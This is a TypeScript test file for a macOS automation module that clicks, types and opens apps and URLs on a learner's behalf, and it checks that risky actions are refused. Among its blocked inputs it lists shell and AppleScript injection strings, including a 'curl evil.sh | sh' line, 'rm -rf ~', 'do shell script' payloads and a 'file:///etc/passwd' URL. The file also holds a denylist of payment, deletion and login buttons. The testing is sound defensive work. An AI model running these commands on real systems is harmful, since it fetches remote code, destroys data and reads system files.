import { describe, expect, it, vi } from 'vitest'
import { clickScript, createActuator, scrollScript, typeScript } from './index'
import { isValidNormPoint, normToPoints } from './mapping'
import { denylistMatch } from './policy'
import { checkAppName, checkKeyCombo, checkTypedText, checkUrl, SETTINGS_PANES } from './validate'

const bounds = { x: 0, y: 0, width: 1728, height: 1117 }

describe('normToPoints', () => {
  it('maps to display POINTS (retina already folded into bounds), not device pixels', () => {
    expect(normToPoints({ x: 500, y: 500 }, bounds)).toEqual({ x: 864, y: 559 })
    expect(normToPoints({ x: 0, y: 0 }, bounds)).toEqual({ x: 0, y: 0 })
    expect(normToPoints({ x: 1000, y: 1000 }, bounds)).toEqual({ x: 1728, y: 1117 })
  })
  it('honours a display that is not at the origin', () => {
    expect(normToPoints({ x: 500, y: 500 }, { x: -2560, y: -300, width: 2560, height: 1440 })).toEqual({ x: -1280, y: 420 })
  })
  it('rejects out-of-range or non-finite points', () => {
    expect(isValidNormPoint({ x: 1001, y: 5 })).toBe(false)
    expect(isValidNormPoint({ x: Number.NaN, y: 5 })).toBe(false)
    expect(isValidNormPoint({ x: 10, y: 1000 })).toBe(true)
  })
})

describe('denylist', () => {
  it.each(['Pay now', 'Purchase', 'Buy', 'Place order', 'Checkout', 'Check out', 'Send', 'Submit', 'Delete', 'Remove', 'Erase', 'Transfer', 'Confirm', 'Sign in', 'sign-in', 'Log in', 'Login', 'Password', 'Card number', 'Allow', 'Grant access', 'Install', 'Accept'])('refuses %s', (label) => {
    expect(denylistMatch(label)).not.toBeNull()
  })
  it('is case-insensitive and also checks the target text', () => {
    expect(denylistMatch('SEND')).toBe('send')
    expect(denylistMatch('OK', 'the button that says Delete account')).toBe('delete')
  })
  it.each(['Settings', 'Start call', 'Camera', 'Share', 'Hang up', 'Messages', 'Border', 'Open Photos'])('allows %s', (label) => {
    expect(denylistMatch(label)).toBeNull()
  })
})

function make(over: Parameters<typeof createActuator>[0] = {}) {
  const osascript = vi.fn(async (_args: string[]) => undefined)
  const openExternal = vi.fn(async (_url: string) => undefined)
  const openAppProcess = vi.fn(async (_name: string) => undefined)
  const showItemInFolder = vi.fn((_p: string) => undefined)
  const log = vi.fn()
  const actuator = createActuator({ platform: 'darwin', displayBounds: () => bounds, isTrusted: () => true, dryRun: false, osascript, openExternal, openAppProcess, showItemInFolder, exists: () => true, homedir: '/Users/me', log, ...over })
  return { actuator, osascript, openExternal, openAppProcess, showItemInFolder, log }
}

describe('status / canClick', () => {
  it('reports Accessibility and dry-run', () => {
    expect(make({ isTrusted: () => false }).actuator.status()).toEqual({ accessibility: false, dryRun: false })
    expect(make().actuator.status()).toEqual({ accessibility: true, dryRun: false })
    expect(make({ dryRun: true, isTrusted: () => false }).actuator.status()).toEqual({ accessibility: false, dryRun: true })
  })
  it('canClick reflects trust and is true in dry run', () => {
    expect(make({ isTrusted: () => false }).actuator.canClick()).toBe(false)
    expect(make().actuator.canClick()).toBe(true)
    expect(make({ dryRun: true, isTrusted: () => false }).actuator.canClick()).toBe(true)
  })
})

describe('openUrl', () => {
  it('opens http, https and localhost addresses through shell.openExternal', async () => {
    const t = make()
    expect(await t.actuator.openUrl('https://www.bbc.co.uk/news')).toEqual({ ok: true })
    expect(await t.actuator.openUrl('http://localhost:5180/index.html?still=1#video')).toEqual({ ok: true })
    expect(await t.actuator.openUrl('http://127.0.0.1:7777/health')).toEqual({ ok: true })
    expect(t.openExternal.mock.calls.map((c) => c[0])).toEqual(['https://www.bbc.co.uk/news', 'http://localhost:5180/index.html?still=1#video', 'http://127.0.0.1:7777/health'])
  })
  it.each([
    'javascript:alert(1)',
    'JaVaScRiPt:alert(1)',
    'file:///etc/passwd',
    'data:text/html,<script>alert(1)</script>',
    'ftp://example.com/x',
    'x-apple.systempreferences:com.apple.preference.security',
    'tel:+441234567',
    'https://user:pass@example.com/',
    'https://evil.com@example.com/',
    'http://:secret@example.com/',
    'java\nscript:alert(1)',
    'https://exa mple.com',
    'https://example.com/\u0000',
    '',
    'not a url',
    `https://example.com/${'a'.repeat(2100)}`,
  ])('blocks %j', async (url) => {
    const t = make()
    const r = await t.actuator.openUrl(url)
    expect(r).toMatchObject({ ok: false, reason: 'blocked' })
    expect(t.openExternal).not.toHaveBeenCalled()
  })
  it('normalises the address it hands to the OS', () => {
    expect(checkUrl('  HTTPS://Example.com  ')).toEqual({ ok: true, value: 'https://example.com/' })
  })
  it('needs no Accessibility', async () => {
    expect(await make({ isTrusted: () => false }).actuator.openUrl('https://example.com')).toEqual({ ok: true })
  })
  it('reports an OS failure', async () => {
    const t = make({ openExternal: async () => Promise.reject(new Error('no handler')) })
    expect(await t.actuator.openUrl('https://example.com')).toEqual({ ok: false, reason: 'failed', detail: 'no handler' })
  })
})

describe('openApp', () => {
  it('opens a plain app name with `open -a` semantics (argument, no shell)', async () => {
    const t = make()
    expect(await t.actuator.openApp('Google Chrome')).toEqual({ ok: true })
    expect(await t.actuator.openApp('  Visual   Studio Code ')).toEqual({ ok: true })
    expect(await t.actuator.openApp('iTerm2 beta.1-x'.replace('iTerm2', 'Photo Booth'))).toEqual({ ok: true })
    expect(t.openAppProcess.mock.calls.map((c) => c[0])).toEqual(['Google Chrome', 'Visual Studio Code', 'Photo Booth beta.1-x'])
  })
  it.each([
    'Safari; rm -rf ~',
    'Safari && curl evil.sh | sh',
    '$(whoami)',
    '`id`',
    'Safari"',
    "Safari'",
    'Safari\nTerminal',
    '-n Safari',
    '--args',
    '.hidden',
    'tell application "Finder" to quit',
    'do shell script "id"',
    '../../Applications/Foo',
    '/Applications/Safari.app',
    'a'.repeat(61),
    '',
    '   ',
  ])('blocks %j', async (name) => {
    const t = make()
    expect(await t.actuator.openApp(name)).toMatchObject({ ok: false, reason: 'blocked' })
    expect(t.openAppProcess).not.toHaveBeenCalled()
  })
  it.each(['Terminal', 'terminal', 'iTerm', 'iTerm2', 'Script Editor', 'Automator', 'Keychain Access', 'Warp'])('does not open %s for the learner', async (name) => {
    const t = make()
    expect(await t.actuator.openApp(name)).toMatchObject({ ok: false, reason: 'blocked' })
    expect(checkAppName(name).ok).toBe(false)
  })
  it('fails (not blocks) when the app is not installed', async () => {
    const t = make({ openAppProcess: async () => Promise.reject(new Error('Unable to find application named Nope')) })
    expect(await t.actuator.openApp('Nope')).toMatchObject({ ok: false, reason: 'failed' })
  })
})

describe('revealPath', () => {
  it('reveals an existing absolute path or ~/ path', async () => {
    const t = make()
    expect(await t.actuator.revealPath('/Users/me/Documents/letter.pdf')).toEqual({ ok: true })
    expect(await t.actuator.revealPath('~/Downloads')).toEqual({ ok: true })
    expect(t.showItemInFolder.mock.calls.map((c) => c[0])).toEqual(['/Users/me/Documents/letter.pdf', '/Users/me/Downloads'])
  })
  it('blocks relative, empty, NUL and over-long paths; fails for a missing one', async () => {
    const t = make()
    for (const p of ['Documents/x', '', 'x\0y', `/${'a'.repeat(1100)}`]) expect(await t.actuator.revealPath(p)).toMatchObject({ ok: false, reason: 'blocked' })
    const missing = make({ exists: () => false })
    expect(await missing.actuator.revealPath('/nope')).toMatchObject({ ok: false, reason: 'failed' })
    expect(missing.showItemInFolder).not.toHaveBeenCalled()
    expect(t.showItemInFolder).not.toHaveBeenCalled()
  })
})

describe('openSettingsPane', () => {
  it('opens only panes from the fixed table', async () => {
    const t = make()
    expect(await t.actuator.openSettingsPane('screen')).toEqual({ ok: true })
    expect(await t.actuator.openSettingsPane('accessibility-display')).toEqual({ ok: true })
    expect(t.openExternal.mock.calls[0][0]).toBe(SETTINGS_PANES.screen)
    expect(await t.actuator.openSettingsPane('../../x' as never)).toMatchObject({ ok: false, reason: 'blocked' })
    expect(await t.actuator.openSettingsPane('constructor' as never)).toMatchObject({ ok: false, reason: 'blocked' })
    expect(await t.actuator.openSettingsPane('https://evil.example' as never)).toMatchObject({ ok: false, reason: 'blocked' })
    expect(t.openExternal).toHaveBeenCalledTimes(2)
  })
})

describe('clickAt', () => {
  it('refuses without Accessibility and never runs a script', async () => {
    const t = make({ isTrusted: () => false })
    expect(await t.actuator.clickAt({ x: 500, y: 500 })).toEqual({ ok: false, reason: 'accessibility' })
    expect(t.osascript).not.toHaveBeenCalled()
  })
  it('performs one click via System Events at integer points', async () => {
    const t = make()
    expect(await t.actuator.clickAt({ x: 500, y: 500 })).toEqual({ ok: true })
    expect(t.osascript).toHaveBeenCalledTimes(1)
    expect(t.osascript).toHaveBeenCalledWith(['-e', 'tell application "System Events" to click at {864, 559}'])
    expect(clickScript(1.4, 2.6)).toEqual(['-e', 'tell application "System Events" to click at {1, 3}'])
  })
  it('double click is two clicks in one script', async () => {
    const t = make()
    await t.actuator.clickAt({ x: 0, y: 0 }, { double: true })
    expect(t.osascript).toHaveBeenCalledTimes(1)
    const args = t.osascript.mock.calls[0][0]
    expect(args.filter((a) => a === 'click at {0, 0}')).toHaveLength(2)
  })
  it('blocks points off the display and reports script failures', async () => {
    const t = make()
    expect(await t.actuator.clickAt({ x: 2000, y: 0 })).toMatchObject({ ok: false, reason: 'blocked' })
    expect(await t.actuator.clickAt({ x: Number.NaN, y: 0 })).toMatchObject({ ok: false, reason: 'blocked' })
    const failing = make({ osascript: async () => Promise.reject(new Error('not allowed assistive access')) })
    expect(await failing.actuator.clickAt({ x: 1, y: 1 })).toEqual({ ok: false, reason: 'failed', detail: 'not allowed assistive access' })
    expect(await make({ platform: 'linux' }).actuator.clickAt({ x: 1, y: 1 })).toMatchObject({ ok: false, reason: 'failed' })
  })
})

describe('typeText: injection and limits', () => {
  const PAYLOADS = [
    'hello',
    'say "hi"',
    'back\\slash',
    '\\"; do shell script "id" --\\"',
    '" & (do shell script "touch /tmp/pwned") & "',
    'tell application "Finder" to delete every item',
    "'; rm -rf ~ #",
    '-e do shell script "id"',
    '--version',
    '$(whoami) `id` ${HOME}',
    'end run\\ntell app "Terminal" to do script "x"',
    'ünïcødé 你好 😀',
  ]
  it.each(PAYLOADS)('passes %j as DATA (argv after --), never inside the script source', async (text) => {
    const t = make()
    expect(await t.actuator.typeText(text)).toEqual({ ok: true })
    const args = t.osascript.mock.calls[0][0]
    expect(args).toEqual(typeScript(text))
    const dashIdx = args.indexOf('--')
    expect(args.slice(dashIdx + 1)).toEqual([text])
    // The script source (every -e statement) is the same fixed text whatever was typed.
    const source = args.slice(0, dashIdx).filter((a) => a !== '-e')
    expect(source).toEqual(['on run argv', 'tell application "System Events" to keystroke (item 1 of argv)', 'end run'])
    for (const line of source) expect(line).not.toContain(text.length > 3 ? text : '\u0001')
  })
  it('blocks control characters (newline, return, tab, NUL, escape), empty text and over-long text', async () => {
    const t = make()
    for (const text of ['a\nb', 'a\rb', 'a\tb', 'a\0b', 'a\u001bb', '\u007f', '']) {
      expect(await t.actuator.typeText(text)).toMatchObject({ ok: false, reason: 'blocked' })
    }
    expect(await t.actuator.typeText('a'.repeat(301))).toMatchObject({ ok: false, reason: 'blocked' })
    expect(await t.actuator.typeText('a'.repeat(300))).toEqual({ ok: true })
    expect(t.osascript).toHaveBeenCalledTimes(1)
    expect(checkTypedText('x').ok).toBe(true)
  })
  it('needs Accessibility, and the log never contains the typed text', async () => {
    const denied = make({ isTrusted: () => false })
    expect(await denied.actuator.typeText('hello')).toEqual({ ok: false, reason: 'accessibility' })
    expect(denied.osascript).not.toHaveBeenCalled()
    const t = make()
    await t.actuator.typeText('my secret pin 1234')
    expect(JSON.stringify(t.log.mock.calls)).not.toContain('1234')
  })
})

describe('pressKeys allowlist', () => {
  it.each([
    ['return', 'tell application "System Events" to key code 36'],
    ['Enter', 'tell application "System Events" to key code 36'],
    ['tab', 'tell application "System Events" to key code 48'],
    ['esc', 'tell application "System Events" to key code 53'],
    ['space', 'tell application "System Events" to key code 49'],
    ['left', 'tell application "System Events" to key code 123'],
    ['Right', 'tell application "System Events" to key code 124'],
    ['down', 'tell application "System Events" to key code 125'],
    ['UpArrow', 'tell application "System Events" to key code 126'],
    ['cmd+l', 'tell application "System Events" to keystroke "l" using {command down}'],
    ['Command+T', 'tell application "System Events" to keystroke "t" using {command down}'],
    ['cmd+w', 'tell application "System Events" to keystroke "w" using {command down}'],
    ['cmd+v', 'tell application "System Events" to keystroke "v" using {command down}'],
    ['cmd+c', 'tell application "System Events" to keystroke "c" using {command down}'],
    ['cmd+a', 'tell application "System Events" to keystroke "a" using {command down}'],
    ['cmd+f', 'tell application "System Events" to keystroke "f" using {command down}'],
  ])('allows %s', async (combo, statement) => {
    const t = make()
    expect(await t.actuator.pressKeys(combo)).toEqual({ ok: true })
    expect(t.osascript).toHaveBeenCalledWith(['-e', statement])
  })
  it.each([
    'cmd+shift+4',
    'cmd+q',
    'cmd+option+escape',
    'cmd+tab',
    'cmd+space',
    'cmd+delete',
    'cmd+shift+l',
    'ctrl+c',
    'alt+f4',
    'delete',
    'f5',
    'cmd+',
    '+',
    '',
    'cmd+l"; do shell script "id',
    'return\ndelete',
    'cmd+l+t',
    'a',
    'cmd+x',
  ])('blocks %j', async (combo) => {
    const t = make()
    expect(await t.actuator.pressKeys(combo)).toMatchObject({ ok: false, reason: 'blocked' })
    expect(t.osascript).not.toHaveBeenCalled()
    expect(checkKeyCombo(combo).ok).toBe(false)
  })
  it('needs Accessibility', async () => {
    const t = make({ isTrusted: () => false })
    expect(await t.actuator.pressKeys('return')).toEqual({ ok: false, reason: 'accessibility' })
    expect(t.osascript).not.toHaveBeenCalled()
  })
})

describe('scroll', () => {
  it('moves to the point and scrolls with numbers passed as argv (dy > 0 reads further down)', async () => {
    const t = make()
    expect(await t.actuator.scroll({ x: 500, y: 500 }, 5)).toEqual({ ok: true })
    const args = t.osascript.mock.calls[0][0]
    expect(args).toEqual(scrollScript(864, 559, 5))
    expect(args.slice(args.indexOf('--') + 1)).toEqual(['864', '559', '-5'])
    expect(args.slice(0, 2)).toEqual(['-l', 'JavaScript'])
  })
  it('blocks zero, huge, non-finite amounts and off-display points; needs Accessibility', async () => {
    const t = make()
    for (const dy of [0, 51, -51, Number.NaN, Infinity]) expect(await t.actuator.scroll({ x: 1, y: 1 }, dy)).toMatchObject({ ok: false, reason: 'blocked' })
    expect(await t.actuator.scroll({ x: 1001, y: 1 }, 3)).toMatchObject({ ok: false, reason: 'blocked' })
    expect(t.osascript).not.toHaveBeenCalled()
    expect(await make({ isTrusted: () => false }).actuator.scroll({ x: 1, y: 1 }, 3)).toEqual({ ok: false, reason: 'accessibility' })
  })
})

describe('dry run', () => {
  it('logs every call, performs nothing, needs no Accessibility, still validates', async () => {
    const t = make({ dryRun: true, isTrusted: () => false })
    const results = [
      await t.actuator.openUrl('https://example.com'),
      await t.actuator.openApp('Safari'),
      await t.actuator.revealPath('/Users/me/x'),
      await t.actuator.openSettingsPane('displays'),
      await t.actuator.clickAt({ x: 10, y: 10 }, { double: true }),
      await t.actuator.typeText('hello'),
      await t.actuator.pressKeys('cmd+l'),
      await t.actuator.scroll({ x: 10, y: 10 }, 3),
    ]
    for (const r of results) expect(r).toMatchObject({ ok: true, reason: 'dry-run' })
    expect(t.log).toHaveBeenCalledTimes(8)
    expect(t.openExternal).not.toHaveBeenCalled()
    expect(t.openAppProcess).not.toHaveBeenCalled()
    expect(t.showItemInFolder).not.toHaveBeenCalled()
    expect(t.osascript).not.toHaveBeenCalled()
    // Blocked input is still blocked in dry run (so tests of refusals are meaningful).
    expect(await t.actuator.openUrl('javascript:alert(1)')).toMatchObject({ ok: false, reason: 'blocked' })
    expect(await t.actuator.pressKeys('cmd+q')).toMatchObject({ ok: false, reason: 'blocked' })
  })
})
